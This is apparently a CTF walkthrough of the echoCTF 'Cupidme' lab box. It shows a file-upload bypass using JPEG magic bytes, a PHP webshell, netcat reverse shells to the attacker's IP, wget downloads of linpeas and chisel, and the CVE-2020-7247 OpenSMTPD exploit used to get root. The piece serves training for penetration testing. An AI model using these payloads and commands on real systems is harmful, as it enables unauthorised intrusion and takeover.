---
title: "echoCTF Cupidme Writeup: File Upload to Root via SMTP"
date: 2025-07-14
categories: ["CTF", "OSCP Prep", "echoCTF"]
tags: ["file upload", "PHP webshell", "SMTP exploit", "privilege escalation"]
description: "Step-by-step guide to cracking Cupidme on echoCTF with file upload exploits and SMTP vulnerabilities. Perfect for OSCP prep!"
---

## Video Walkthrough

{{< youtube WN2w8sJOLlI >}}

[![Watch on YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube)](https://www.youtube.com/watch?v=WN2w8sJOLlI)

# Cupidme

# Enumeration

Start by port scanning the target machine
## NMAP

```bash
sudo nmap -nvv -p- 10.0.50.1 -T4 -sC -sV
```
## Output

```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
|_http-title: Welcome to Cupid's homepage
| http-methods: 
|_  Supported Methods: GET HEAD POST
```

Found an nginx webserver version 1.14.2 running on port 80.

Visiting the webserver and `viewing its source code` we found a hidden upload form and an indication that the webserver uses PHP as the form "action=upload.php" exposes the programming language used!

![Image Description](/images/cupid1.png)

By using browser developer tools we can `edit the html tag` and remove the comment html tags thus making it visible to us. Alternately we can to that using Burp (or any other web proxy).

![Image Description](/images/cupid2%201.png)

![Image Description](/images/cupid3.png)

Before we test the upload functionality let start a web directory brute force to find new directories or files that might be hidden.

```bash
gobuster dir -u http://10.0.50.1/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt

/images               (Status: 301) [Size: 185] [--> http://10.0.50.1/images/]
/LICENSE              (Status: 200) [Size: 1075]
/.                    (Status: 301) [Size: 185] [--> http://10.0.50.1/./]
```

We discover an image directory  however when try to access it we get 403 FORBIDDEN.

![Image Description](/images/cupid4.png)

# Exploitation

Lets test the upload functionality by first uploading a simple .txt file and then try to access it from the "/image" directory. We going to use Burp Suite during the upload functionality to analyze the behavior.

Captured the upload functionality via Burp Suite:
![Image Description](/images/cupid5.png)

Send it to repeater with CTRL + R so we can repeat the request without going through the whole process of  capturing the request > removing the commented form and then upload a file.

![Image Description](/images/cupid6.png)

So we get an error back showing that our Mime-type is wrong. So I did a bit of research of how can we change the Mime-type of a file in Linux and i manage to do it! 

At the start I believed that the "Content-Type" is the MIme-type but this is not the case..

> The main difference depends upon their usage: MimeType describes the nature and format of a file or data across various systems, While **ContentType is used in HTTP headers to include not only the MimeType but also additional parameters such as character encoding**

So how does a ".jpeg" file looks in raw format. Lets upload a legitimate .jpeg file and see if its accepted.

![Image Description](/images/cupid7.png)

Indeed the .jpeg file is accepted, as we can see the error changed. When i try to copy and paste the contents of file colored in red under the `Content-Type:image/jpeg` i came across an overview explaining that `"ÿØÿî"` its the JPEG `magic number`

![Image Description](/images/cupid8.png)![Image Description](/images/cupid9.png)

The searching the keyword `files magic numbers` i landed here.

https://en.wikipedia.org/wiki/List_of_file_signatures

![Image Description](/images/cipd10.png)

If we search for JPEG we can see its `magic byte` representation

![Image Description](/images/cupid11.png)

Now that we know that lets try to replace the rest of the content of JPEG image with text and leave only the magic byte as is. Also change the file extension to `.txt`

![Image Description](/images/cupid12.png)

We did it !
Trying to view the file on `/images`  downloads the file with our text!

```bash
cat ~/Downloads/video-001.rgb.txt
����
Dotpirate Test
```

Since we know that the webserver can run PHP scripts we can try and upload a reverse shell and see how it behaves.

![Image Description](/images/cupid14.png)

```bash
cat video-001.rgb.jpeg.php

ÿØÿî
<?php system($_GET['dot']); ?>
```

![Image Description](/images/cupid15.png)

And we get execution on the server by visiting : 
`http://10.0.50.1/images/video-001.rgb.jpeg.php?dot=id`

Lets get a reverse shell!

First lets check if `netcat` is installed on the target sever by using `which nc`

![Image Description](/images/cupid17.png)

The binary is there so lets try to get a revshell now.

```bash
sudo nc -nvlp 80

http://10.0.50.1/images/video-001.rgb.jpeg.php?dot=nc 10.10.11.150 80 -e /bin/bash
```

![Image Description](/images/cupid18.png)

Success!

# Privilege Escalation

Lets upgrade our shell using python

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo;fg
(Press Enter)
(Press Enter)
(Press Enter)

export TERM=xterm
```

Manual enumeration i always do before going for automated scripts

```bash
# Check who we are?
id

# What other users exist on the box?
cat /etc/passwd | grep sh$

# Do i have sudo capabilities?
sudo -l

# Are there ant localservices running on the box?
netstat -ano | grep LIST
ss -antp

# Always check the directroy we landed it, in this case is `/var/www/html/images`
ls -la

# Check for wierd files in `/opt` and `/tmp`
ls -la /tmp && ls -la /opt
```

Analyzing the output:

```bash
www-data@cupidme:~/html/images$ pwd
/var/www/html/images

www-data@cupidme:~/html/images$ ls -la /tmp && ls -la /opt
total 8
drwxrwxrwt 1 root root 4096 Aug 12 09:05 .
drwxr-xr-x 1 root root 4096 Aug 12 07:23 ..
total 8
drwxr-xr-x 2 root root 4096 Oct 12  2020 .
drwxr-xr-x 1 root root 4096 Aug 12 07:23 ..

www-data@cupidme:~/html/images$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
sudo: 3 incorrect password attempts

www-data@cupidme:~/html/images$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@cupidme:~/html/images$ cat /etc/passwd |grep sh$
root:x:0:0:root:/root:/bin/bash
ETSCTF:x:375:65534:ETSCTF_e20a6a5bf097fd763539867c299ece88:/home/ETSCTF:/bin/bash

www-data@cupidme:~/html/images$ ss -antp
State                  Recv-Q             Send-Q                         Local Address:Port                          Peer Address:Port                                                                                                                                                   
LISTEN                 0                  511                                127.0.0.1:9001                               0.0.0.0:*                 users:(("ss",pid=2161,fd=5),("bash",pid=2055,fd=5),("python3",pid=2054,fd=5),("bash",pid=2009,fd=5),("sh",pid=2008,fd=5))            
LISTEN                 0                  5                                  127.0.0.1:25                                 0.0.0.0:*                                                                                                                                                      
LISTEN                 0                  4096                              127.0.0.11:33755                              0.0.0.0:*                                                                                                                                                      
LISTEN                 0                  511                                  0.0.0.0:80                                 0.0.0.0:*                 users:(("nginx",pid=62,fd=6),("nginx",pid=61,fd=6),("nginx",pid=60,fd=6))                                                            
TIME-WAIT              0                  0                                  127.0.0.1:47982                            127.0.0.1:80                                                                                                                                                     
TIME-WAIT              0                  0                                  127.0.0.1:54946                            127.0.0.1:80                                                                                                                                                     
TIME-WAIT              0                  0                                  127.0.0.1:57956                            127.0.0.1:9001                                                                                                                                                   
TIME-WAIT              0                  0                                  127.0.0.1:52330                            127.0.0.1:9001                                                                                                                                                   
TIME-WAIT              0                  0                                  127.0.0.1:9001                             127.0.0.1:57944                                                                                                                                                  
ESTAB                  0                  2                                  10.0.50.1:51938                         10.10.11.150:80                users:(("python3",pid=2054,fd=1),("python3",pid=2054,fd=0),("bash",pid=2009,fd=1),("bash",pid=2009,fd=0))                            
CLOSE-WAIT             9                  0                                  127.0.0.1:9001                             127.0.0.1:42676             users:(("ss",pid=2161,fd=3),("bash",pid=2055,fd=3),("python3",pid=2054,fd=3),("bash",pid=2009,fd=3),("sh",pid=2008,fd=3))            
TIME-WAIT              0                  0                                  127.0.0.1:9001                             127.0.0.1:52314                                                                                                                                                  
www-data@cupidme:~/html/images$ 
```

There are 2 local services running on ports 25 which SMTP and 9001 which is unknown for as at the moment. We can further fingerprint this ports using `nc` since is already installed on the target machine.
```bash
www-data@cupidme:~/html/images$ nc -nvC 127.0.0.1 9001
(UNKNOWN) [127.0.0.1] 9001 (?) open
HELP
?

www-data@cupidme:~/html/images$ nc -nvC 127.0.0.1 25
(UNKNOWN) [127.0.0.1] 25 (?) open
220 cupidme.echocity-f.com ESMTP OpenSMTPD
VERSION
500 5.5.1 Invalid command: Command unrecognized
HELP
214-2.0.0 This is OpenSMTPD
214-2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org
214-2.0.0 with full details
214 2.0.0 End of HELP info
```

Now we now that port 25 is running `OpenSMTPD`.
Lets do an automated enumeration as well using linpeas.sh by first transferring it to the server.

An easy way to transfer files is by using http, utilizing python3 to server webserver and then use either `curl` or `wget` to download it.

> More File Transfer Techniques can be found in my [notes](/notes/File%20Transfers/)
> Also linpeas can be found [here](https://github.com/peass-ng/PEASS-ng/releases/download/20250801-03e73bf3/linpeas.sh)

```bash
# On kali
python3 -m http.server 80

# On Target
wget http://10.10.11.150/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

We can see that the `smtpd` is running as root
![Image Description](/images/cupid19.png)

We can also see that that port 9001 is the website running locally
![Image Description](/images/cupid20.png)

According to the enumeration, it seems that the logical path to follow is towards exploiting the SMTPD service since its running as root and we can also interact with it. Lets find out the version of the OpenSMTPD and see if it is vulnerable to any publicly known exploits.

I could not find a way to get the version of the `opensmtpd` service so I decided to do port forwarding and then run nmap on it. For this I used `chisel` 

> Various Port Forwarding concepts can also be found in my [notes](/notes/Port%20Forwarding/)
> Chisel binaries can be found [here](https://github.com/jpillora/chisel/releases/tag/v1.10.1)

```bash
# On Kali
python3 -m http.server 80
./chisel server --reverse --port 8810

# On Target
wget http://10.10.11.150/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.10.11.150:8810 R:25:127.0.0.1:25

# On Kali
sudo nmap -vv -p25 127.0.0.1 -sC -sV

PORT   STATE SERVICE REASON         VERSION
25/tcp open  smtp    syn-ack ttl 64 OpenSMTPD
| smtp-commands: cupidme.echocity-f.com Hello localhost [127.0.0.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
Service Info: Host: cupidme.echocity-f.com
```

Now we got the version! `OpenSMTPD 2.0.0` lets search for an exploit

![Image Description](/images/cupid21.png)

To use this exploit the developer suggest to install some python libraries and then use it.

```bash
python3 -m venv .venv
source .venv/bin/activate 
pip3 install pwntools

git clone https://github.com/SimonSchoeni/CVE-2020-7247-POC.git
cd CVE-2020-7247-POC
# Creating a file to see if we have command execution!
python3 exploit.py --targetHost 127.0.0.1 --targetPort 25 --customCommand 'touch /tmp/fromroot'
```

We can see that we do have command execution and the file is created in /tmp by root!

![Image Description](/images/cupid22.png)

Lets get a reverse shell using `nc`

```bash
sudo nc -nvlp 1337

python3 exploit.py --targetHost 127.0.0.1 --targetPort 25 --customCommand 'nc 10.10.11.150 1337 -e /bin/bash'
```


![Image Description](/images/cupid23.png)

ROOT!
